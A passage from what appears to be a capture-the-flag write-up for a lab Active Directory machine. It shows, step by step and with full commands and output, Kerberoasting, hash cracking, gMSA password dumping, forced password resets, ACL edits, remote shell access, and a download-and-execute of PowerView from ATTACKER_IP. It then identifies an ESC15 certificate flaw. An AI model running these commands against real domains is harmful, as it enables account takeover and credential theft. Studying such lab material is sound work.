SMB         10.10.11.72     445    DC01
SMB         10.10.11.72     445    DC01             Password Complexity Flags: 000000
SMB         10.10.11.72     445    DC01                 Domain Refuse Password Change: 0
SMB         10.10.11.72     445    DC01                 Domain Password Store Cleartext: 0
SMB         10.10.11.72     445    DC01                 Domain Password Lockout Admins: 0
SMB         10.10.11.72     445    DC01                 Domain Password No Clear Change: 0
SMB         10.10.11.72     445    DC01                 Domain Password No Anon Change: 0
SMB         10.10.11.72     445    DC01                 Domain Password Complex: 0
SMB         10.10.11.72     445    DC01
SMB         10.10.11.72     445    DC01             Minimum password age: None
SMB         10.10.11.72     445    DC01             Reset Account Lockout Counter: 30 minutes
SMB         10.10.11.72     445    DC01             Locked Account Duration: 30 minutes
SMB         10.10.11.72     445    DC01             Account Lockout Threshold: None
SMB         10.10.11.72     445    DC01             Forced Log off Time: Not Set
```

The `bloodhound-python` collector was run and the results imported into BloodHound.

```
fcoomans@kali:~/htb/tombwatcher$ bloodhound-python --zip -ns 10.10.11.72 -d tombwatcher.htb -c All --dns-tcp -u henry -p H3nry_987TGV!
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 32S
INFO: Compressing output into 20250718111818_bloodhound.zip
```

Henry had `WriteSPN` permissions on user Alfred.  This allows me to run a Kerberoast on Alfred.

![](images/Pasted%20image%2020250718072718.png)

Alfred had the `AddSelf` permission on the `INFRASTRUCTURE` group.  So, Alfred can add himself to this group.

![](images/Pasted%20image%2020250718183702.png)

The `INFRASTRUCTURE` group has `ReadGMSAPassword` on the `ANSIBLE_DEV$` computer account.  This means that once Henry has been added to the `INFRASTRUCTURE` group that he can read the GMSA password for the `ANSIBLE_DEV$` computer account.

![](images/Pasted%20image%2020250718073724.png)

The `ANSIBLE_DEV$` computer account had the `ForceChangePassword` permissions for the Sam user account.  The computer account can, therefore, change Sam's password.

![](images/Pasted%20image%2020250718073844.png)

Sam had the `WriteOwner` permission on the John user account object.  Sam can add himself as the owner of John user account object and then change John's password.  

![](images/Pasted%20image%2020250718074040.png)

John was a member of the `Remote Management Users` group, which means that John could WinRM into the target.

![](images/Pasted%20image%2020250718074437.png)

Here is a consolidated image showing the full attack chain from Henry to ultimately taking over John's user account.

![](images/Pasted%20image%2020250718184107.png)

### 🧪 Exploitation

#### 🍖 Kerberoasting Alfred

Here is BloodHound's suggestion to abuse `WriteSPN` from Linux.

![](images/Pasted%20image%2020250718072718.png)

I started by cloning the https://github.com/ShutdownRepo/targetedKerberoast repo, setting up a Python virtual environment and activating it and then installing the requirements/dependencies to get the tool working.

```
fcoomans@kali:~/htb/tombwatcher$ git clone https://github.com/ShutdownRepo/targetedKerberoast
Cloning into 'targetedKerberoast'...
remote: Enumerating objects: 76, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 76 (delta 19), reused 17 (delta 14), pack-reused 43 (from 1)
Receiving objects: 100% (76/76), 252.17 KiB | 321.00 KiB/s, done.
Resolving deltas: 100% (30/30), done.

fcoomans@kali:~/htb/tombwatcher$ cd targetedKerberoast

fcoomans@kali:~/htb/tombwatcher/targetedKerberoast$ python -m venv targetedKerberoast

fcoomans@kali:~/htb/tombwatcher/targetedKerberoast$ . ./targetedKerberoast/bin/activate

(targetedKerberoast)fcoomans@kali:~/htb/tombwatcher/targetedKerberoast$ pip install -r requirements.txt
Collecting ldap3 (from -r requirements.txt (line 1))

<SNIP>
```

`ntpdate` was used to sync the attack host time with the target domain time,

```
(targetedKerberoast)fcoomans@kali:~/htb/tombwatcher/targetedKerberoast$ sudo ntpdate dc01.tombwatcher.htb
2025-07-18 11:30:46.683766 (+0200) +119.081663 +/- 0.083554 dc01.tombwatcher.htb 10.10.11.72 s1 no-leap
CLOCK: time stepped by 119.081663
```

 And then `targetedKerberoast` was used to Kerberoast Alfred's user account.

```
(targetedKerberoast)fcoomans@kali:~/htb/tombwatcher/targetedKerberoast$ python targetedKerberoast.py --dc-host dc01.tombwatcher.htb -d tombwatcher.htb -u henry -p H3nry_987TGV! --request-user 'alfred' -f hashcat -o hashes.kerberoast
[*] Starting kerberoast attacks
[*] Attacking user (alfred)
[+] Writing hash to file for (Alfred)

(targetedKerberoast)fcoomans@kali:~/htb/tombwatcher/targetedKerberoast$ deactivate
```

Alfred's password hash was written to the `hashes.kerberoast` file.

```
fcoomans@kali:~/htb/tombwatcher/targetedKerberoast$ cat hashes.kerberoast
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$307a4a366a8658e68b12647fdd4b681c$91416127ad1cfb58542515b49a83689c455e830a7ff95ed4b571d12e3890e4720448772f6a1a1ddcc7d003a1e7af6af6fbe8941c1759c5ec17ed49193c3ace66908eb4cbc3612487e14c38c5b8df73be84bf735b87a2414d89ffc2e69c8d18ccf65650504c719567420a40a13d2c75320bfb452b72230d0e31b84b6a7adc72a3c74ab495a099916894cbf69b54f33e87d07fa5c75081dbff70fa9eeb93a4201a3f66e90aaf6658361885f0b07dd79d8ca4625e8fc5530f5fa68adb35ac4d8a54058016fe406f20c465e4ee70b62ba88794456c4eedfb4c2f744438bdee57d5434a9fec16fd08c14c98d3d4d1d7e34acd25423bfbc77477dfcca96fbb0b00d43ba2aa2490f876d697b08329c35359150cab909c97c832902424b2fbf1e24e60bc44b73815c57195ed72e754a9e3d5c3bbd4a0d569373bf7d340fd4bc1e3e8ba87c6a08ce800a31f13315f754b74b23286ca065ca73036b4b81bb49509acec7e2c4e306a57c434f759dd6564561451d2912dcc0039d3ab84da506f55bf81b68a9fe78b5512afb0d8ca7c43b5b062ffc20d5d03deadce9bda014032afa2139db03afa03607a43aeeb3fb3412d674757fe64adfe3c7a5f385b23e9e247dd261df498145067c82011a6d247c344f7607db04b38e9811bebaf9618aaf62710527cb80796625dce0fdeac0e04cec88ed6632762546eb20b3670ecdb85d392d7877069afbb5487550123a312a6ff85e5f2cae78004832fdd8ed0c206acbe6d9d880b5aa27aacdfb03698032c633602f5ba0600534650e3aae3c17253aad8518864423f22af3af7823e155a97b30d239c0c3c231735772c19303a43a7b439aeff77e3904238d2e0ca37d621a9533112c2710cc0196dba90a79fff77d36d235ff93bf4d7ac6e47a0f203b7f017c92e5cbf3cad8fa9467c0ba3cd523ebda0e391df99aaa31e501342dd3c40380aafbf05f3e019eceb13e7ce8915e25e8bbdc17f36619f1e1dc05a4dac21818e4928a8e67ed73e8e7cff88f0978f47b2ec3783957f3d9f8d64764df4d44edd3cb07830585dbf0238eb69b1b9cfed7ae387bb304b39318e9f894bb046991347bd3dfa349c252abb4ec8eb2c0964079e35273c9fd564eb61c3838addc3bcad600bb4a52afb6ecda55e1844038d4d761448d0f071f33493f54922956bd743d67e8377807e045b4fa3074e41b9052eb4448bce3a1425a2a9b0c2038ce56aed552e969d2e6ccaf9d7e6e519a5c9734b59a22cad64971a91e6f41817f17dd7501056bc1b42d792b7b07b374da028cf72b98f62e8d7bcbbcf12e025054fb1bb702c3be75f3c672ff7d50b55957a3e706285240c0ea0626221c75d46700faecfacd72fb448acdf7d108427c05a174f7ce1232d427e501b92af296c09632332850309eefe239e951fba54e26811cb50dae68bc3798cfd7c7b82651086b82eb7e4b565fbfc66ede7fa44bc7f4e60402c87fe04
```

The command `hashcat --help |grep -i tgs` was used on older versions of `hashcat` to determine what mode should be used when cracking the hash.  The TGS-REP is  using etype 23, as indicated by the `$23$` in the hash (`$krb5tgs$23$*Alfred$<SNIP>`).  
This way of detecting which hash mode to use was, however, removed in newer versions of `hashcat`.

```
fcoomans@kali:~/htb/tombwatcher/targetedKerberoast$ hashcat --help |grep -i tgs
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
```

In newer versions, you simply run `hashcat --identify hashes.kerberoast`, which simplifies the mode detection process.

```
fcoomans@kali:~/htb/tombwatcher/targetedKerberoast$ hashcat --identify hashes.kerberoast
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
```

Alfred's hash was cracked using `hashcat`, with mode `13100` and the `rockyou.txt` wordlist.  His password was `basketball`.

```
fcoomans@kali:~/htb/tombwatcher/targetedKerberoast$ hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$307a4a366a8658e68b12647fdd4b681c$91416127ad1cfb58542515b49a83689c455e830a7ff95ed4b571d12e3890e4720448772f6a1a1ddcc7d003a1e7af6af6fbe8941c1759c5ec17ed49193c3ace66908eb4cbc3612487e14c38c5b8df73be84bf735b87a2414d89ffc2e69c8d18ccf65650504c719567420a40a13d2c75320bfb452b72230d0e31b84b6a7adc72a3c74ab495a099916894cbf69b54f33e87d07fa5c75081dbff70fa9eeb93a4201a3f66e90aaf6658361885f0b07dd79d8ca4625e8fc5530f5fa68adb35ac4d8a54058016fe406f20c465e4ee70b62ba88794456c4eedfb4c2f744438bdee57d5434a9fec16fd08c14c98d3d4d1d7e34acd25423bfbc77477dfcca96fbb0b00d43ba2aa2490f876d697b08329c35359150cab909c97c832902424b2fbf1e24e60bc44b73815c57195ed72e754a9e3d5c3bbd4a0d569373bf7d340fd4bc1e3e8ba87c6a08ce800a31f13315f754b74b23286ca065ca73036b4b81bb49509acec7e2c4e306a57c434f759dd6564561451d2912dcc0039d3ab84da506f55bf81b68a9fe78b5512afb0d8ca7c43b5b062ffc20d5d03deadce9bda014032afa2139db03afa03607a43aeeb3fb3412d674757fe64adfe3c7a5f385b23e9e247dd261df498145067c82011a6d247c344f7607db04b38e9811bebaf9618aaf62710527cb80796625dce0fdeac0e04cec88ed6632762546eb20b3670ecdb85d392d7877069afbb5487550123a312a6ff85e5f2cae78004832fdd8ed0c206acbe6d9d880b5aa27aacdfb03698032c633602f5ba0600534650e3aae3c17253aad8518864423f22af3af7823e155a97b30d239c0c3c231735772c19303a43a7b439aeff77e3904238d2e0ca37d621a9533112c2710cc0196dba90a79fff77d36d235ff93bf4d7ac6e47a0f203b7f017c92e5cbf3cad8fa9467c0ba3cd523ebda0e391df99aaa31e501342dd3c40380aafbf05f3e019eceb13e7ce8915e25e8bbdc17f36619f1e1dc05a4dac21818e4928a8e67ed73e8e7cff88f0978f47b2ec3783957f3d9f8d64764df4d44edd3cb07830585dbf0238eb69b1b9cfed7ae387bb304b39318e9f894bb046991347bd3dfa349c252abb4ec8eb2c0964079e35273c9fd564eb61c3838addc3bcad600bb4a52afb6ecda55e1844038d4d761448d0f071f33493f54922956bd743d67e8377807e045b4fa3074e41b9052eb4448bce3a1425a2a9b0c2038ce56aed552e969d2e6ccaf9d7e6e519a5c9734b59a22cad64971a91e6f41817f17dd7501056bc1b42d792b7b07b374da028cf72b98f62e8d7bcbbcf12e025054fb1bb702c3be75f3c672ff7d50b55957a3e706285240c0ea0626221c75d46700faecfacd72fb448acdf7d108427c05a174f7ce1232d427e501b92af296c09632332850309eefe239e951fba54e26811cb50dae68bc3798cfd7c7b82651086b82eb7e4b565fbfc66ede7fa44bc7f4e60402c87fe04:basketball

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb...87fe04

<SNIP>
```

NetExec (`nxc`) confirmed that this password was indeed valid.

```
fcoomans@kali:~/htb/tombwatcher$ nxc ldap dc01.tombwatcher.htb -u alfred -p basketball
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\alfred:basketball
```

#### 👥 Add Alfred to the INFRASTRUCTURE Group

Here is BloodHound's suggestion to abuse `AddSelf` from Linux, but I decided to use `bloodyAD` instead as it's arguably easier to use, when working with AD objects.

![](images/Pasted%20image%2020250718183702.png)

With Alfred's password in hand, I used `bloodyAD` to add Alfred to the `INFRASTRUCTURE` group.

```
fcoomans@kali:~/htb/tombwatcher$ bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u alfred -p basketball get object --attr member INFRASTRUCTURE

distinguishedName: CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb

fcoomans@kali:~/htb/tombwatcher$ bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u alfred -p basketball add groupMember INFRASTRUCTURE alfred
[+] alfred added to INFRASTRUCTURE

fcoomans@kali:~/htb/tombwatcher$ bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u alfred -p basketball get object --attr member INFRASTRUCTURE


distinguishedName: CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb
member: CN=Alfred,CN=Users,DC=tombwatcher,DC=htb
```

#### 🧾 Read ANSIBLE_DEV$ GMSA Password

Here is BloodHound's suggestion to abuse `ReadGMSAPassword` from Linux.

![](images/Pasted%20image%2020250718073724.png)

I started by cloning the https://github.com/micahvandeusen/gMSADumper repo, created a Python virtual environment and activated it.  I then installed the requirements/dependencies to get the tool working.

```
fcoomans@kali:~/htb/tombwatcher$ git clone https://github.com/micahvandeusen/gMSADumper
Cloning into 'gMSADumper'...
remote: Enumerating objects: 54, done.
remote: Counting objects: 100% (54/54), done.
remote: Compressing objects: 100% (38/38), done.
remote: Total 54 (delta 22), reused 38 (delta 14), pack-reused 0 (from 0)
Receiving objects: 100% (54/54), 38.35 KiB | 7.67 MiB/s, done.
Resolving deltas: 100% (22/22), done.

fcoomans@kali:~/htb/tombwatcher$ cd gMSADumper

fcoomans@kali:~/htb/tombwatcher/gMSADumper$ python -m venv gMSADumper

fcoomans@kali:~/htb/tombwatcher/gMSADumper$ . ./gMSADumper/bin/activate

(gMSADumper)fcoomans@kali:~/htb/tombwatcher/gMSADumper$ pip install -r requirements.txt
Collecting impacket==0.10.0 (from -r requirements.txt (line 1))
  Downloading impacket-0.10.0.tar.gz (1.4 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.4/1.4 MB 10.8 MB/s eta 0:00:00

<SNIP>
```

`gMSADumper.py` was then used to read the GMSA password hash as user Alfred for the `ANSIBLE_DEV$` computer account.

```
(gMSADumper)fcoomans@kali:~/htb/tombwatcher/gMSADumper$ python gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::7bc5a56af89da4d3c03bc048055350f2
ansible_dev$:aes256-cts-hmac-sha1-96:29a7e3cc3aaad2b30beca182a9707f1a1e71d2eb49a557d50f9fd91360ec2f64
ansible_dev$:aes128-cts-hmac-sha1-96:de6c86d8b6a71c4538f82dc570f7f9a6

(gMSADumper)fcoomans@kali:~/htb/tombwatcher/gMSADumper$ deactivate
```

Netexec (`nxc`) once again confirmed that the password hash was indeed valid.

```
fcoomans@kali:~/htb/tombwatcher$ nxc ldap dc01.tombwatcher.htb -u ANSIBLE_DEV$ -H 7bc5a56af89da4d3c03bc048055350f2
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\ANSIBLE_DEV$:7bc5a56af89da4d3c03bc048055350f2
```

#### ⚔️ Force Password change for Sam

Here is BloodHound's suggestion to abuse `ForceChangePassword` from Linux, but I opted to use `bloodyAD` for this instead.

![](images/Pasted%20image%2020250718073844.png)

With the `ANSIBLE_DEV$` computer hash in hand, I changed Sam's password.

```
fcoomans@kali:~/htb/tombwatcher$ bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p :7bc5a56af89da4d3c03bc048055350f2 set password sam Password123!
[+] Password changed successfully!
```

NetExec (`nxc`) once again confirmed that the newly set password was indeed valid for user Sam.

```
fcoomans@kali:~/htb/tombwatcher$ nxc ldap dc01.tombwatcher.htb -u sam -p Password123!
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\sam:Password123!
```

#### 🔄 Change Password for John

Here is BloodHound's suggestion to abuse `WriteOwner` from Linux.  I used most of the tools, but used `bloodyAD` to ultimately reset the password.

![](images/Pasted%20image%2020250718074040.png)

I made Sam, John's new user object Owner, using `impacket-owneredit`.   The initial Owner was `Domain Admins`.

```
fcoomans@kali:~/htb/tombwatcher$ impacket-owneredit -action write -new-owner sam -target john 'tombwatcher.htb/sam:Password123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
``
fcoomans@kali:~/htb/tombwatcher$ impacket-owneredit -action read -target john 'tombwatcher.htb/sam:Password123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-1105
[*] - sAMAccountName: sam
[*] - distinguishedName: CN=sam,CN=Users,DC=tombwatcher,DC=htb
```

`impacket-dacledit` was then used to give Sam `FullControl` over John's user object.

```
fcoomans@kali:~/htb/tombwatcher$ impacket-dacledit -action write -rights FullControl -principal sam -target john 'tombwatcher.htb/sam:Password123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL modified successfully!
```

And finally `bloodyAD` was used to set John's password as user Sam.

```
fcoomans@kali:~/htb/tombwatcher$ bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u sam -p Password123! set password john Password123!
[+] Password changed successfully!
```

NetExec (`nxc`) confirmed that the newly set password for user John was indeed valid.

```
fcoomans@kali:~/htb/tombwatcher$ nxc ldap dc01.tombwatcher.htb -u john -p Password123!
LDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\john:Password123!
```

I then used `evil-winrm` to connect to the target.

```
fcoomans@kali:~/htb/tombwatcher$ evil-winrm -i dc01.tombwatcher.htb -u john -p Password123!

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> whoami
tombwatcher\john
```

### 💰 Post Exploitation

#### 🚩 user.txt

John was the holder of the `user.txt` flag.

```
*Evil-WinRM* PS C:\Users\john\Documents> type C:\Users\john\Desktop\user.txt
768444437d2b74811a0d1d9071e1eabc
```

## 💳 ADCS Abuse

### 🔎 Recon

This was what BloodHound recommended I do to exploit John's `GenericAll` permissions over the `ADCS` container.

![](images/Pasted%20image%2020250718074355.png)

I decided to share `PowerView` with a Python web server.

```
fcoomans@kali:~/htb/tombwatcher$ python -m http.server -d /usr/share/windows-resources/powersploit/Recon
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And downloaded it on the target.

```
*Evil-WinRM* PS C:\Users\john\Documents> iex (iwr http://ATTACKER_IP:8000/PowerView.ps1 -UseBasicParsing)
```

#### 🔄 Change Password for cert_admin

I then checked what permissions John through the `ADCS` container inheritance had `GenericAll` access to the `cert_admin` user account.  John could also `Renanimate-Tombstones`, which meant that John could restore deleted AD Objects.

```
*Evil-WinRM* PS C:\Users\john\Documents> $sid = Convert-NameToSid john
*Evil-WinRM* PS C:\Users\john\Documents> Get-ObjectAcl -ResolveGUIDs |Where-Object { $_.SecurityIdentifier -eq $sid }


AceQualifier           : AccessAllowed
ObjectDN               : DC=tombwatcher,DC=htb
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : Reanimate-Tombstones
ObjectSID              : S-1-5-21-1392491010-1358638721-2126982587
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1392491010-1358638721-2126982587-1106
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceType               : AccessAllowed
ObjectDN              : OU=ADCS,DC=tombwatcher,DC=htb
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             :
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-1392491010-1358638721-2126982587-1106
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : OU=ADCS,DC=tombwatcher,DC=htb
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             :
InheritanceFlags      : ContainerInherit, ObjectInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-1392491010-1358638721-2126982587-1106
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ObjectInherit, ContainerInherit
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1392491010-1358638721-2126982587-1111
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : True
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-1392491010-1358638721-2126982587-1106
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit, Inherited
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-1392491010-1358638721-2126982587-1111
InheritanceFlags      : ContainerInherit, ObjectInherit
BinaryLength          : 36
IsInherited           : True
IsCallback            : False
PropagationFlags      : InheritOnly
SecurityIdentifier    : S-1-5-21-1392491010-1358638721-2126982587-1106
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ObjectInherit, ContainerInherit, InheritOnly, Inherited
AceQualifier          : AccessAllowed
```

I tried to use the built-in `Get-DomainUser` cmdlet to look at `cert_admin`, but found that `PowerView` messed up the built-in cmdlets.

```
*Evil-WinRM* PS C:\Users\john\Documents> Get-DomainUser cert_admin
```

I disconnected from `evil-winrm` and reconnected with John's credentials.  `Get-ADObject` confirmed that `cert_admin` was deleted/tombstoned.

```
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties lastKnownParent,ObjectSID


Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   :
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 34509cb3-2b23-417b-8b98-13f0bd953319

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectSID         : S-1-5-21-1392491010-1358638721-2126982587-1109

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectSID         : S-1-5-21-1392491010-1358638721-2126982587-1110

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectSID         : S-1-5-21-1392491010-1358638721-2126982587-1111
```

`Restore-ADObject` restored the `cert_admin` user account.

```
*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADUser cert_admin


DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
Enabled           : True
GivenName         : cert_admin
Name              : cert_admin
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
SamAccountName    : cert_admin
SID               : S-1-5-21-1392491010-1358638721-2126982587-1111
Surname           : cert_admin
UserPrincipalName :
```

`bloodyAD` was then used to set the password for user `cert_admin`.

```
fcoomans@kali:~/htb/tombwatcher$ bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u john -p Password123! set password cert_admin Password123!
[+] Password changed successfully!
```

NetExec (`nxc`) confirmed that the newly set password was valid and that the account worked.

```
fcoomans@kali:~/htb/tombwatcher$ nxc smb dc01.tombwatcher.htb -u cert_admin -p Password123!
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\cert_admin:Password123!
```

`certipy-ad` was used to find Active Directory Certificate Services (ADCS) vulnerabilities.

```
fcoomans@kali:~/htb/tombwatcher$ certipy-ad find -u cert_admin -p Password123! -ns 10.10.11.72 -dc-ip dc01.tombwatcher.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250718220316_Certipy.txt'
[*] Wrote text output to '20250718220316_Certipy.txt'
[*] Saving JSON output to '20250718220316_Certipy.json'
[*] Wrote JSON output to '20250718220316_Certipy.json'
```

#### 🐞 ECS15 ADCS Vulnerability

Looking at the output file confirmed that the ADCS was vulnerable to ECS15.

```
fcoomans@kali:~/htb/tombwatcher$ cat 20250718220316_Certipy.txt

<SNIP>

  17
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.

<SNIP>
```

